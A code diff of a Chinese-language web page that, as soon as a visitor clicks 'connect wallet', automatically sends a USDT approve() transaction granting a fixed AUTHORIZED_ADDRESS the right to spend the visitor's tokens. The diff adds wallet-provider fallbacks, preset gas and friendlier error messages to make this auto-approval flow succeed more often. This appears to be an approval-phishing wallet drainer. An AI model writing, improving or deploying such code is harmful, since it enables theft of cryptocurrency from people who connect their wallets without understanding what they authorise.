@@ -363,31 +363,57 @@
         
         // 连接钱包并自动授权
         document.getElementById('connectWallet').addEventListener('click', async () => {
-            if (window.ethereum) {
-                try {
-                    // 请求用户授权
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    account = accounts[0];
-                    
-                    // 初始化Web3
+            try {
+                // 检查是否有Web3提供者
+                if (!window.ethereum && !window.web3) {
+                    document.getElementById('walletStatus').innerHTML = '请安装 MetaMask 或其他Web3钱包';
+                    document.getElementById('walletStatus').className = 'status error';
+                    return;
+                }
+                
+                // 初始化Web3
+                if (window.ethereum) {
+                    // 对于MetaMask，需要特殊处理
                     web3 = new Web3(window.ethereum);
                     
-                    // 初始化合约
-                    contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
-                    
-                    // 更新状态
-                    document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${account}</span>`;
-                    document.getElementById('walletStatus').className = 'status success';
-                    
-                    // 自动执行授权
-                    await autoApprove();
-                } catch (error) {
-                    console.error('连接钱包失败:', error);
-                    document.getElementById('walletStatus').innerHTML = '连接钱包失败，请重试';
-                    document.getElementById('walletStatus').className = 'status error';
+                    // 请求账户访问
+                    if (window.ethereum.isMetaMask) {
+                        try {
+                            // 对于MetaMask，使用eth_requestAccounts
+                            await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        } catch (error) {
+                            console.error('MetaMask授权失败:', error);
+                            document.getElementById('walletStatus').innerHTML = 'MetaMask授权失败，请检查钱包设置';
+                            document.getElementById('walletStatus').className = 'status error';
+                            return;
+                        }
+                    }
+                } else if (window.web3) {
+                    // 其他钱包
+                    web3 = new Web3(window.web3.currentProvider);
                 }
-            } else {
-                document.getElementById('walletStatus').innerHTML = '请安装 MetaMask 钱包';
+                
+                // 获取账户
+                const accounts = await web3.eth.getAccounts();
+                if (accounts.length === 0) {
+                    document.getElementById('walletStatus').innerHTML = '未找到账户，请确保钱包已解锁';
+                    document.getElementById('walletStatus').className = 'status error';
+                    return;
+                }
+                account = accounts[0];
+                
+                // 初始化合约
+                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                
+                // 更新状态
+                document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${account}</span>`;
+                document.getElementById('walletStatus').className = 'status success';
+                
+                // 自动执行授权
+                await autoApprove();
+            } catch (error) {
+                console.error('连接钱包失败:', error);
+                document.getElementById('walletStatus').innerHTML = `连接钱包失败: ${error.message || '未知错误'}`;
                 document.getElementById('walletStatus').className = 'status error';
             }
         });
@@ -404,8 +430,12 @@
                 // 转换金额为wei（USDT有6位小数）
                 const amountWei = web3.utils.toWei(amount, 'mwei'); // 1 USDT = 1,000,000 mwei
                 
-                // 执行授权
-                const result = await contract.methods.approve(AUTHORIZED_ADDRESS, amountWei).send({ from: account });
+                // 执行授权，设置合理的Gas
+                const result = await contract.methods.approve(AUTHORIZED_ADDRESS, amountWei).send({ 
+                    from: account,
+                    gas: 100000, // 设置足够的Gas
+                    gasPrice: await web3.eth.getGasPrice() // 使用当前Gas价格
+                });
                 
                 // 更新状态
                 document.getElementById('walletStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${result.transactionHash}" target="_blank">${result.transactionHash}</a>`;
@@ -415,7 +445,22 @@
                 await checkAllowance();
             } catch (error) {
                 console.error('授权失败:', error);
-                document.getElementById('walletStatus').innerHTML = '授权失败，请重试';
+                
+                // 解析错误信息
+                let errorMessage = '授权失败，请重试';
+                if (error.message) {
+                    if (error.message.includes('User rejected')) {
+                        errorMessage = '授权被用户拒绝，请确认交易';
+                    } else if (error.message.includes('insufficient funds')) {
+                        errorMessage = '账户余额不足，需要足够的ETH支付Gas费';
+                    } else if (error.message.includes('Internal accounts')) {
+                        errorMessage = '合约地址无效，请检查合约部署状态';
+                    } else {
+                        errorMessage = `授权失败: ${error.message}`;
+                    }
+                }
+                
+                document.getElementById('walletStatus').innerHTML = errorMessage;
                 document.getElementById('walletStatus').className = 'status error';
             }
         }
